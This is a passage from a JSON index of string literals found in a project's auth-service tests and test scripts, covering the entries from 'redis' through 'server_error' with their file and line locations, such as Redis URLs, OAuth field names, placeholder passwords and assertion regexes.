        "scripts/analyze_test_mocks.py:20",
        "scripts/analyze_test_mocks.py:52",
        "scripts/analyze_test_mocks.py:53",
        "scripts/auto_fix_test_sizes.py:352",
        "scripts/business_value_test_index.py:380",
        "scripts/business_value_test_index.py:438",
        "scripts/test_backend.py:115",
        "scripts/test_backend.py:132",
        "scripts/test_coordination_fixes.py:236"
      ]
    },
    "redis.Redis.get": {
      "value": "redis.Redis.get",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:426"
      ]
    },
    "redis.Redis.ping": {
      "value": "redis.Redis.ping",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:173",
        "auth_service/tests/auth-service-down-critical-scenarios.py:422"
      ]
    },
    "redis.asyncio.from_url": {
      "value": "redis.asyncio.from_url",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:173"
      ]
    },
    "redis://invalid-host:9999": {
      "value": "redis://invalid-host:9999",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:84",
        "auth_service/tests/integration/test_redis_connection_failover.py:109",
        "auth_service/tests/integration/test_redis_connection_failover.py:141",
        "auth_service/tests/integration/test_redis_connection_failover.py:220",
        "auth_service/tests/integration/test_redis_connection_failover.py:321"
      ]
    },
    "redis://localhost:6379": {
      "value": "redis://localhost:6379",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:48",
        "auth_service/tests/integration/test_redis_connection_failover.py:150",
        "auth_service/tests/integration/test_redis_connection_failover.py:193",
        "auth_service/tests/integration/test_redis_connection_failover.py:267"
      ]
    },
    "redis://localhost:6379/0": {
      "value": "redis://localhost:6379/0",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:128"
      ]
    },
    "redis://localhost:6379/1": {
      "value": "redis://localhost:6379/1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/conftest.py:34",
        "scripts/test_backend.py:81"
      ]
    },
    "redis://localhost:6379/15": {
      "value": "redis://localhost:6379/15",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:32",
        "auth_service/tests/config/test_env.py:164",
        "auth_service/tests/config/test_env.py:173",
        "auth_service/tests/config/test_env.py:183",
        "auth_service/tests/config/test_env.py:194",
        "auth_service/tests/config/test_settings.py:26"
      ]
    },
    "redis://localhost:6380": {
      "value": "redis://localhost:6380",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:157"
      ]
    },
    "redis://staging-redis:6379/0": {
      "value": "redis://staging-redis:6379/0",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:226"
      ]
    },
    "redis:7": {
      "value": "redis:7",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:76"
      ]
    },
    "redis_client": {
      "value": "redis_client",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:247"
      ]
    },
    "redis_connection": {
      "value": "redis_connection",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:41"
      ]
    },
    "redis_url": {
      "value": "redis_url",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:128",
        "scripts/unified_test_config.py:136",
        "scripts/unified_test_config.py:144",
        "scripts/unified_test_config.py:152",
        "scripts/unified_test_config.py:309",
        "scripts/unified_test_config.py:310"
      ]
    },
    "redis|Redis|REDIS": {
      "value": "redis|Redis|REDIS",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:438"
      ]
    },
    "redundant tests...": {
      "value": "redundant tests...",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:294"
      ]
    },
    "refresh": {
      "value": "refresh",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:102",
        "auth_service/tests/test_auth_token_generation.py:113",
        "auth_service/tests/test_auth_token_generation.py:232",
        "auth_service/tests/test_auth_token_security.py:349",
        "auth_service/tests/test_auth_token_security.py:352",
        "auth_service/tests/test_auth_token_security.py:358",
        "auth_service/tests/test_auth_token_validation.py:62",
        "auth_service/tests/test_auth_token_validation.py:66",
        "auth_service/tests/test_auth_token_validation.py:227",
        "auth_service/tests/test_auth_token_validation.py:231"
      ]
    },
    "refresh123": {
      "value": "refresh123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:538"
      ]
    },
    "refresh_token": {
      "value": "refresh_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:117",
        "auth_service/tests/base/test_mixins.py:207",
        "auth_service/tests/base/test_mixins.py:249",
        "auth_service/tests/base/test_mixins.py:255",
        "auth_service/tests/base/test_mixins.py:261",
        "auth_service/tests/factories/token_factory.py:194",
        "auth_service/tests/integration/test_auth_oauth_errors.py:46",
        "auth_service/tests/integration/test_auth_oauth_google.py:55",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:165",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1380"
      ]
    },
    "refresh_token_": {
      "value": "refresh_token_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/session_factory.py:110",
        "auth_service/tests/factories/session_factory.py:181"
      ]
    },
    "refresh_token_123": {
      "value": "refresh_token_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:91",
        "auth_service/tests/unit/test_oauth_models.py:101"
      ]
    },
    "refresh_token_hash": {
      "value": "refresh_token_hash",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/session_factory.py:113"
      ]
    },
    "refreshed": {
      "value": "refreshed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:172"
      ]
    },
    "related": {
      "value": "related",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:329",
        "scripts/analyze_test_overlap.py:354",
        "scripts/analyze_test_overlap.py:532"
      ]
    },
    "remaining requests, got": {
      "value": "remaining requests, got",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:248"
      ]
    },
    "remove": {
      "value": "remove",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:86"
      ]
    },
    "replace": {
      "value": "replace",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:46",
        "scripts/autonomous_review/test_generator.py:66",
        "scripts/autonomous_review/test_reviewer.py:146",
        "scripts/autonomous_review/test_reviewer.py:222",
        "scripts/test_frontend.py:57",
        "scripts/test_frontend.py:80",
        "scripts/test_frontend.py:87",
        "scripts/test_frontend.py:198",
        "scripts/test_frontend.py:241",
        "scripts/test_frontend.py:305"
      ]
    },
    "replacement": {
      "value": "replacement",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:24",
        "scripts/batch_fix_and_test.py:30",
        "scripts/batch_fix_and_test.py:36",
        "scripts/batch_fix_and_test.py:52"
      ]
    },
    "replay": {
      "value": "replay",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:280"
      ]
    },
    "report": {
      "value": "report",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:400",
        "scripts/test_backend_optimized.py:214"
      ]
    },
    "reports": {
      "value": "reports",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:25",
        "scripts/remove_test_stubs.py:343",
        "scripts/test_backend.py:313",
        "scripts/test_backend.py:313",
        "scripts/test_backend.py:314",
        "scripts/test_backend.py:402"
      ]
    },
    "repository": {
      "value": "repository",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:36"
      ]
    },
    "request_id": {
      "value": "request_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:273",
        "auth_service/tests/auth-service-down-critical-scenarios.py:279",
        "auth_service/tests/auth-service-down-critical-scenarios.py:281"
      ]
    },
    "request_success_rate": {
      "value": "request_success_rate",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:265"
      ]
    },
    "request_timeout": {
      "value": "request_timeout",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:45",
        "scripts/test_cold_start_e2e.py:239",
        "scripts/test_cold_start_e2e.py:334",
        "scripts/test_cold_start_e2e.py:356"
      ]
    },
    "requests": {
      "value": "requests",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:72",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:123",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:170",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:202",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:226",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:248",
        "scripts/analyze_test_mocks.py:56"
      ]
    },
    "require": {
      "value": "require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:252"
      ]
    },
    "required_services": {
      "value": "required_services",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:168",
        "scripts/unified_test_config.py:177",
        "scripts/unified_test_config.py:186"
      ]
    },
    "requires_real_llm": {
      "value": "requires_real_llm",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:902"
      ]
    },
    "requires_real_services": {
      "value": "requires_real_services",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:901"
      ]
    },
    "research": {
      "value": "research",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:42"
      ]
    },
    "resilience": {
      "value": "resilience",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:115",
        "scripts/unified_test_config.py:119"
      ]
    },
    "resource": {
      "value": "resource",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:58",
        "auth_service/tests/factories/permission_factory.py:210"
      ]
    },
    "resource_monitoring": {
      "value": "resource_monitoring",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:171"
      ]
    },
    "response": {
      "value": "response",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:112",
        "auth_service/tests/integration/test_auth_oauth_errors.py:169",
        "auth_service/tests/integration/test_auth_oauth_errors.py:177",
        "auth_service/tests/integration/test_auth_oauth_errors.py:185",
        "auth_service/tests/integration/test_auth_oauth_errors.py:193",
        "auth_service/tests/integration/test_auth_oauth_errors.py:209",
        "auth_service/tests/integration/test_auth_oauth_errors.py:248",
        "auth_service/tests/integration/test_auth_oauth_errors.py:253",
        "auth_service/tests/integration/test_auth_oauth_errors.py:258",
        "auth_service/tests/integration/test_auth_oauth_errors.py:263"
      ]
    },
    "response time degradation": {
      "value": "response time degradation",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:89"
      ]
    },
    "response_data": {
      "value": "response_data",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:181",
        "auth_service/tests/integration/test_auth_oauth_google.py:187",
        "auth_service/tests/integration/test_auth_oauth_google.py:193",
        "auth_service/tests/integration/test_auth_oauth_google.py:203"
      ]
    },
    "response_time": {
      "value": "response_time",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:48",
        "scripts/test_staging_deployment.py:58",
        "scripts/test_staging_deployment.py:95",
        "scripts/test_staging_deployment.py:118",
        "scripts/test_staging_deployment.py:139"
      ]
    },
    "response_time_ms": {
      "value": "response_time_ms",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:149",
        "netra_backend/app/services/realistic_test_data/log_generator.py:158",
        "netra_backend/app/services/realistic_test_data/log_generator.py:174",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:199"
      ]
    },
    "response_type=code": {
      "value": "response_type=code",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:106"
      ]
    },
    "results": {
      "value": "results",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:118",
        "scripts/compliance/fake_test_scanner.py:141",
        "scripts/comprehensive_test_fixer.py:410",
        "scripts/iterative_test_fix_loop.py:86",
        "scripts/test_backend_optimized.py:142",
        "scripts/test_backend_optimized.py:203",
        "scripts/test_backend_optimized.py:274",
        "scripts/test_oauth_local.py:460",
        "scripts/test_workflows_with_act.py:360"
      ]
    },
    "retry": {
      "value": "retry",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:403"
      ]
    },
    "retry_after": {
      "value": "retry_after",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:70",
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:70",
        "netra_backend/app/services/realistic_test_data/models.py:114",
        "netra_backend/app/services/realistic_test_data/models.py:125",
        "auth_service/tests/auth-service-down-critical-scenarios.py:152"
      ]
    },
    "return\\s*\\[\\s*\\{\\s*[\"\\']id[\"\\']\\s*:\\s*[\"\\']1[\"\\']": {
      "value": "return\\s*\\[\\s*\\{\\s*[\"\\']id[\"\\']\\s*:\\s*[\"\\']1[\"\\']",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:56"
      ]
    },
    "return\\s*\\{\\s*[\"\\']status[\"\\']\\s*:\\s*[\"\\']ok[\"\\']\\s*\\}": {
      "value": "return\\s*\\{\\s*[\"\\']status[\"\\']\\s*:\\s*[\"\\']ok[\"\\']\\s*\\}",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:58"
      ]
    },
    "return\\s*\\{\\s*[\"\\']test[\"\\']\\s*:\\s*[\"\\']data[\"\\']\\s*\\}": {
      "value": "return\\s*\\{\\s*[\"\\']test[\"\\']\\s*:\\s*[\"\\']data[\"\\']\\s*\\}",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:57"
      ]
    },
    "revenue_to_cost_ratio": {
      "value": "revenue_to_cost_ratio",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:265"
      ]
    },
    "review_assertion": {
      "value": "review_assertion",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:66"
      ]
    },
    "revocation-user-123": {
      "value": "revocation-user-123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:255"
      ]
    },
    "revoke@example.com": {
      "value": "revoke@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:256"
      ]
    },
    "revoke@netrasystems.ai": {
      "value": "revoke@netrasystems.ai",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:242"
      ]
    },
    "rich": {
      "value": "rich",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:822"
      ]
    },
    "risk_assessment": {
      "value": "risk_assessment",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:36"
      ]
    },
    "risk_level": {
      "value": "risk_level",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:464",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:473"
      ]
    },
    "role": {
      "value": "role",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1118",
        "scripts/test_cold_start_e2e.py:349"
      ]
    },
    "role_assignment": {
      "value": "role_assignment",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:214"
      ]
    },
    "root": {
      "value": "root",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:114",
        "scripts/unified_test_config.py:162",
        "scripts/unified_test_config.py:171",
        "scripts/unified_test_config.py:180",
        "scripts/unified_test_config.py:319",
        "scripts/unified_test_config.py:400"
      ]
    },
    "route": {
      "value": "route",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:344"
      ]
    },
    "rps": {
      "value": "rps",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:72",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:72",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:123",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:231"
      ]
    },
    "run": {
      "value": "run",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:119",
        "scripts/test_frontend.py:221",
        "scripts/test_frontend.py:223",
        "scripts/test_frontend.py:289",
        "scripts/test_frontend.py:300",
        "scripts/test_frontend.py:314",
        "scripts/test_frontend_simple.py:36",
        "scripts/test_frontend_simple.py:37",
        "scripts/test_frontend_simple.py:38",
        "scripts/test_frontend_simple.py:39"
      ]
    },
    "run_": {
      "value": "run_",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:146"
      ]
    },
    "run_server.py": {
      "value": "run_server.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:279"
      ]
    },
    "runner": {
      "value": "runner",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:85",
        "scripts/unified_test_config.py:165",
        "scripts/unified_test_config.py:174",
        "scripts/unified_test_config.py:183"
      ]
    },
    "runners.py": {
      "value": "runners.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:114"
      ]
    },
    "runs-on:": {
      "value": "runs-on:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:233",
        "scripts/test_workflows_with_act.py:236"
      ]
    },
    "s": {
      "value": "s",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:340",
        "auth_service/tests/auth-service-down-critical-scenarios.py:347",
        "auth_service/tests/auth-service-down-critical-scenarios.py:486",
        "auth_service/tests/test_auth_token_generation.py:272",
        "auth_service/tests/test_auth_token_generation.py:275",
        "auth_service/tests/test_auth_token_generation.py:278",
        "auth_service/tests/test_auth_token_validation.py:215",
        "auth_service/tests/test_auth_token_validation.py:216",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:83",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:85"
      ]
    },
    "s (limit:": {
      "value": "s (limit:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:206"
      ]
    },
    "s - connections failed to close gracefully": {
      "value": "s - connections failed to close gracefully",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:75"
      ]
    },
    "s - no fallback mechanism implemented": {
      "value": "s - no fallback mechanism implemented",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:119"
      ]
    },
    "s >": {
      "value": "s >",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:161",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:334"
      ]
    },
    "s >=": {
      "value": "s >=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:253",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:318"
      ]
    },
    "s but should respect": {
      "value": "s but should respect",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:78"
      ]
    },
    "s limit": {
      "value": "s limit",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:78"
      ]
    },
    "s window": {
      "value": "s window",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:160"
      ]
    },
    "s)": {
      "value": "s)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:430",
        "scripts/startup_test_executor.py:97",
        "scripts/startup_test_executor.py:169",
        "scripts/startup_test_executor.py:261",
        "scripts/test_coordination_fixes.py:63",
        "scripts/test_coordination_fixes.py:65",
        "scripts/test_staging_deployment.py:95",
        "scripts/test_staging_deployment.py:118",
        "scripts/test_staging_deployment.py:139",
        "scripts/test_staging_startup.py:201"
      ]
    },
    "s) completed successfully": {
      "value": "s) completed successfully",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:411"
      ]
    },
    "s) timed out as expected": {
      "value": "s) timed out as expected",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:403"
      ]
    },
    "s):": {
      "value": "s):",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:70"
      ]
    },
    "s, Actual:": {
      "value": "s, Actual:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:85"
      ]
    },
    "s, invalid:": {
      "value": "s, invalid:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:430"
      ]
    },
    "s, should be <10s": {
      "value": "s, should be <10s",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:189"
      ]
    },
    "s, should fail quickly with fallback": {
      "value": "s, should fail quickly with fallback",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:109"
      ]
    },
    "safe_refresh": {
      "value": "safe_refresh",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:250",
        "auth_service/tests/test_security.py:279",
        "auth_service/tests/test_security.py:351"
      ]
    },
    "safe_token": {
      "value": "safe_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:249",
        "auth_service/tests/test_security.py:278",
        "auth_service/tests/test_security.py:350"
      ]
    },
    "scan_timestamp": {
      "value": "scan_timestamp",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:259",
        "scripts/remove_test_stubs.py:309"
      ]
    },
    "scenario": {
      "value": "scenario",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:124",
        "auth_service/tests/test_staging_database_credentials.py:397",
        "auth_service/tests/test_staging_database_credentials.py:406"
      ]
    },
    "scheduler": {
      "value": "scheduler",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:52",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:35"
      ]
    },
    "schema": {
      "value": "schema",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:340"
      ]
    },
    "scope": {
      "value": "scope",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:197",
        "auth_service/tests/factories/token_factory.py:220",
        "auth_service/tests/integration/test_auth_oauth_google.py:107",
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:39"
      ]
    },
    "scope=": {
      "value": "scope=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:327"
      ]
    },
    "scope=openid%20email%20profile": {
      "value": "scope=openid%20email%20profile",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:45"
      ]
    },
    "score": {
      "value": "score",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:641",
        "scripts/business_value_test_index.py:755",
        "scripts/real_service_test_metrics.py:70",
        "scripts/real_service_test_metrics.py:91"
      ]
    },
    "scripts": {
      "value": "scripts",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:26",
        "scripts/standardize_l3_test_names.py:57",
        "scripts/test_frontend.py:524"
      ]
    },
    "scripts/dev_launcher.py": {
      "value": "scripts/dev_launcher.py",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:99",
        "scripts/start_test_services.py:107",
        "scripts/test_cold_start_e2e.py:116"
      ]
    },
    "scripts/verify_workflow_status.py": {
      "value": "scripts/verify_workflow_status.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:32",
        "scripts/test_verify_workflow.py:44",
        "scripts/test_verify_workflow.py:61",
        "scripts/test_verify_workflow_status.py:30",
        "scripts/test_verify_workflow_status_corrected.py:18"
      ]
    },
    "search": {
      "value": "search",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:30",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:189"
      ]
    },
    "seasonality": {
      "value": "seasonality",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:31",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:37",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:43",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:132"
      ]
    },
    "second_use": {
      "value": "second_use",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:310",
        "auth_service/tests/integration/test_redis_connection_failover.py:331"
      ]
    },
    "seconds": {
      "value": "seconds",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:125",
        "scripts/test_backend_optimized.py:329",
        "scripts/unified_test_runner.py:470",
        "scripts/unified_test_runner.py:477"
      ]
    },
    "secret": {
      "value": "secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:524",
        "auth_service/tests/test_critical_oauth_environment_failures.py:156",
        "auth_service/tests/test_five_whys_reproduction.py:150",
        "auth_service/tests/test_five_whys_reproduction.py:153",
        "auth_service/tests/test_security.py:342",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:215"
      ]
    },
    "secrets_loading": {
      "value": "secrets_loading",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:39"
      ]
    },
    "sections completed": {
      "value": "sections completed",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:171"
      ]
    },
    "secure_password": {
      "value": "secure_password",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_examples.py:11",
        "scripts/compliance/test_limits_examples.py:31",
        "scripts/compliance/test_limits_examples.py:39",
        "scripts/compliance/test_limits_examples.py:57",
        "scripts/compliance/test_limits_examples.py:62"
      ]
    },
    "secure_websocket": {
      "value": "secure_websocket",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:125"
      ]
    },
    "security": {
      "value": "security",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:493",
        "scripts/auto_fix_test_violations.py:494",
        "scripts/autonomous_review/test_reviewer.py:217",
        "scripts/autonomous_review/test_reviewer.py:231",
        "scripts/autonomous_review/test_reviewer.py:232",
        "scripts/business_value_test_index.py:89",
        "scripts/business_value_test_index.py:423",
        "scripts/business_value_test_index.py:464",
        "scripts/unified_test_config.py:105",
        "scripts/unified_test_config.py:263"
      ]
    },
    "security-user-999": {
      "value": "security-user-999",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:337"
      ]
    },
    "security@example.com": {
      "value": "security@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:338"
      ]
    },
    "security_level": {
      "value": "security_level",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:126"
      ]
    },
    "seemingly_valid_password": {
      "value": "seemingly_valid_password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:304"
      ]
    },
    "seemingly_valid_user": {
      "value": "seemingly_valid_user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:303",
        "auth_service/tests/test_database_connection_validation.py:317"
      ]
    },
    "self": {
      "value": "self",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:200"
      ]
    },
    "self.": {
      "value": "self.",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:291"
      ]
    },
    "self.assertEqual": {
      "value": "self.assertEqual",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:271"
      ]
    },
    "self\\.(\\w+)": {
      "value": "self\\.(\\w+)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:224"
      ]
    },
    "self\\\\.assertEqual\\\\((.*?),\\\\s*(.*?)\\\\)": {
      "value": "self\\\\.assertEqual\\\\((.*?),\\\\s*(.*?)\\\\)",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:248"
      ]
    },
    "self\\\\.assertFalse\\\\((.*?)\\\\)": {
      "value": "self\\\\.assertFalse\\\\((.*?)\\\\)",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:251"
      ]
    },
    "self\\\\.assertIsNone\\\\((.*?)\\\\)": {
      "value": "self\\\\.assertIsNone\\\\((.*?)\\\\)",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:252"
      ]
    },
    "self\\\\.assertIsNotNone\\\\((.*?)\\\\)": {
      "value": "self\\\\.assertIsNotNone\\\\((.*?)\\\\)",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:253"
      ]
    },
    "self\\\\.assertNotEqual\\\\((.*?),\\\\s*(.*?)\\\\)": {
      "value": "self\\\\.assertNotEqual\\\\((.*?),\\\\s*(.*?)\\\\)",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:249"
      ]
    },
    "self\\\\.assertTrue\\\\((.*?)\\\\)": {
      "value": "self\\\\.assertTrue\\\\((.*?)\\\\)",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:250"
      ]
    },
    "sensitive": {
      "value": "sensitive",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:364",
        "auth_service/tests/test_session_management.py:365",
        "auth_service/tests/test_session_management.py:379",
        "auth_service/tests/test_session_management.py:379"
      ]
    },
    "server_error": {
      "value": "server_error",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:186",
